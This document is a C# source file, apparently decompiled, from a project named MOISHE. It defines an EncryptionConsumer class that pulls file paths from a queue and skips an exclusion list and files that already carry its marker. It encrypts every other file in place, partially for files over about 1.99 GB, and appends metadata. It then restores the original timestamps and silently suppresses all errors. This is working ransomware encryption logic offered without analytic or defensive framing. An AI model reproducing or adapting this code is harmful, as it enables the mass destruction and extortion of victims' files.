using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;

namespace MOISHE.Core;

public class EncryptionConsumer : AbstractConsumer<string>
{
	public const int MOISHE_MAX = 1990000000;

	private Session m_A;

	private List<string> m_A;

	[CompilerGenerated]
	private RecursorItemSubmittedHandler m_A;

	public RecursorItemSubmittedHandler OnItem
	{
		[CompilerGenerated]
		get
		{
			return this.m_A;
		}
		[CompilerGenerated]
		set
		{
			this.m_A = value;
		}
	}

	public EncryptionConsumer(BlockingCollection<string> source, Session session, List<string> protections)
		: base(source)
	{
		this.m_A = session;
		this.m_A = new List<string>();
		this.m_A.AddRange(protections);
	}

	private static int A(Stream stream_0)
	{
		byte[] array = new byte[4];
		long offset = stream_0.Length - array.Length;
		stream_0.Seek(offset, SeekOrigin.Begin);
		stream_0.Read(array, 0, array.Length);
		return BitConverter.ToInt32(array, 0);
	}

	private static EncryptionMetadata A(Stream stream_0, int int_0)
	{
		byte[] array = new byte[int_0];
		long offset = stream_0.Length - (4 + int_0);
		stream_0.Seek(offset, SeekOrigin.Begin);
		stream_0.Read(array, 0, array.Length);
		return EncryptionMetadata.Deserialize(array);
	}

	private static bool A(string string_0)
	{
		try
		{
			using (Stream stream_ = new FileStream(string_0, FileMode.Open, FileAccess.Read))
			{
				int num = A(stream_);
				if (num != 1578)
				{
					return false;
				}
				EncryptionMetadata encryptionMetadata = A(stream_, num);
				if (encryptionMetadata.Version != 1)
				{
					return false;
				}
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	private bool a(string string_0)
	{
		foreach (string item in this.m_A)
		{
			if (!string_0.ToLower().Equals(item.ToLower()))
			{
				if (!string_0.ToLower().EndsWith(item.ToLower()))
				{
					if (!string_0.ToLower().StartsWith(item.ToLower()))
					{
						if (string_0.ToLower().Contains(item.ToLower()))
						{
							return true;
						}
						continue;
					}
					return true;
				}
				return true;
			}
			return true;
		}
		if (A(string_0))
		{
			return true;
		}
		return false;
	}

	protected override void OnItemArrived(string item)
	{
		if (a(item))
		{
			if (OnItem != null)
			{
				OnItem(item);
			}
			return;
		}
		try
		{
			this.m_A.RefreshKey();
			EncryptionMetadata encryptionMetadata_ = this.m_A.CreateMetadata();
			FileInfo fileInfo = new FileInfo(item);
			DateTime creationTime = fileInfo.CreationTime;
			DateTime lastWriteTime = fileInfo.LastWriteTime;
			_ = fileInfo.LastAccessTime;
			if (fileInfo.Exists)
			{
				if (fileInfo.Length <= 1990000000L)
				{
					a(item, encryptionMetadata_);
				}
				else
				{
					A(item, encryptionMetadata_);
				}
				fileInfo.CreationTime = creationTime;
				fileInfo.LastWriteTime = lastWriteTime;
				fileInfo.LastAccessTime = lastWriteTime;
			}
		}
		catch (Exception)
		{
		}
		finally
		{
			if (OnItem != null)
			{
				OnItem(item);
			}
		}
	}

	private void A(string string_0, EncryptionMetadata encryptionMetadata_0)
	{
		byte[] array = new byte[1990000000];
		Stream stream = null;
		Stream stream2 = null;
		int num = 1990000000;
		try
		{
			stream = File.Open(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete);
			stream2 = File.Open(string_0, FileMode.Open, FileAccess.Write, FileShare.ReadWrite | FileShare.Delete);
			using CryptoStream cryptoStream = this.m_A.CreateEncryptor(stream2, PaddingMode.None);
			num = stream.Read(array, 0, array.Length);
			if (num > 0)
			{
				cryptoStream.Write(array, 0, num);
				cryptoStream.Flush();
				cryptoStream.FlushFinalBlock();
				encryptionMetadata_0.Limit = num;
				byte[] array2 = encryptionMetadata_0.Serialized();
				int value = array2.Length;
				byte[] bytes = BitConverter.GetBytes(value);
				stream2.Seek(stream2.Length, SeekOrigin.Begin);
				stream2.Write(array2, 0, array2.Length);
				stream2.Write(bytes, 0, bytes.Length);
				stream2.Flush();
			}
		}
		catch (Exception)
		{
		}
		finally
		{
			stream?.Close();
			stream2?.Close();
		}
	}

	private void a(string string_0, EncryptionMetadata encryptionMetadata_0)
	{
		try
		{
			byte[] array = File.ReadAllBytes(string_0);
			MemoryStream memoryStream = new MemoryStream();
			using (CryptoStream cryptoStream = this.m_A.CreateEncryptor(memoryStream, PaddingMode.PKCS7))
			{
				cryptoStream.Write(array, 0, array.Length);
				cryptoStream.Flush();
				cryptoStream.FlushFinalBlock();
			}
			byte[] array2 = memoryStream.ToArray();
			memoryStream.Dispose();
			encryptionMetadata_0.Limit = array.Length;
			byte[] array3 = encryptionMetadata_0.Serialized();
			int value = array3.Length;
			byte[] bytes = BitConverter.GetBytes(value);
			using FileStream fileStream = new FileStream(string_0, FileMode.Truncate, FileAccess.Write);
			fileStream.Write(array2, 0, array2.Length);
			fileStream.Write(array3, 0, array3.Length);
			fileStream.Write(bytes, 0, bytes.Length);
			fileStream.Flush();
		}
		catch (Exception)
		{
		}
		finally
		{
		}
	}
}
